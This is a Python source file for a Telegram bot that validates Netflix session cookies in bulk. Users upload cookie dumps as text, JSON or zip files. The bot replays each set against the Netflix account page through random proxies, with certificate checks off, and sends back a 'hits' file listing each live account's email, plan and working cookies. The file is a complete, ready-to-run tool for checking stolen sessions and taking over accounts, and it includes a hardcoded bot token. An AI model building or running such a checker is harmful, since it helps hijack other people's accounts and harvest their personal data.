import os
import json
import re
import sys
import random
import time
import threading
import requests
import urllib3
import zipfile
import io
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
BOT_TOKEN = "8715756346:AAEGOxnFtsgGSdvaM3frCFqxPjLf-he2HhY"
UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class NetflixChecker:
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list if proxy_list else []
        
    def _get_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        if not proxy.startswith(('http://', 'https://')):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}

    def parse_cookies(self, text):
        cookies = {}
        text = text.strip()
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        except: pass
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"): continue
            parts = line.split("\t")
            if len(parts) >= 7: cookies[parts[5]] = parts[6]
        if not cookies:
            for part in re.split(r"[;\n]", text):
                if "=" in part:
                    k, _, v = part.partition("=")
                    if k.strip(): cookies[k.strip()] = v.strip()
        return cookies

    def check_account(self, cookies):
        if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
            return None
        sess = requests.Session()
        sess.headers.update({"User-Agent": UA_WEB})
        proxy = self._get_proxy()
        for k, v in cookies.items():
            sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
        try:
            r = sess.get("https://www.netflix.com/account", proxies=proxy, timeout=15, verify=False)
            if "login" in r.url.lower() or r.status_code != 200: return None
            if '"membershipStatus":"CURRENT_MEMBER"' in r.text:
                email = re.search(r'"emailAddress":"([^"]+)"', r.text)
                email = email.group(1) if email else "Unknown"
                plan = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', r.text)
                plan = plan.group(1) if plan else "Unknown"
                return {"email": email, "plan": plan}
        except: pass
        return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 **Netflix Cookie Checker Bot**\n\n"
        "Send me a `.txt`, `.json`, or `.zip` file containing cookies.\n"
        "I will check them using proxies and send you a `hits.txt` file with the working accounts.",
        parse_mode="Markdown"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    file = await doc.get_file()
    file_bytes = await file.download_as_bytearray()
    
    status_msg = await update.message.reply_text("⏳ Processing your file... please wait.")
    
    # Load proxies if Proxy.txt exists
    proxies = []
    if os.path.exists("Proxy.txt"):
        with open("Proxy.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
    
    checker = NetflixChecker(proxies)
    hits = []
    
    # Handle ZIP or single file
    files_to_check = {}
    if doc.file_name.endswith(".zip"):
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
            for name in z.namelist():
                if name.endswith((".txt", ".json")):
                    files_to_check[name] = z.read(name).decode("utf-8", errors="ignore")
    else:
        files_to_check[doc.file_name] = file_bytes.decode("utf-8", errors="ignore")

    for name, content in files_to_check.items():
        cookies = checker.parse_cookies(content)
        if cookies:
            res = checker.check_account(cookies)
            if res:
                hits.append(f"Email: {res['email']}\nPlan: {res['plan']}\nCookies:\n{content}\n{'-'*30}\n")

    if hits:
        output_file = f"hits_{datetime.now().strftime('%H%M%S')}.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.writelines(hits)
        
        await update.message.reply_document(document=open(output_file, "rb"), filename="hits.txt", caption=f"✅ Done! Found {len(hits)} working accounts.")
        os.remove(output_file)
    else:
        await update.message.reply_text("❌ No working cookies found in the provided file.")
    
    await status_msg.delete()

def main():
    print("[*] Bot is starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.run_polling()

if __name__ == "__main__":
    main()
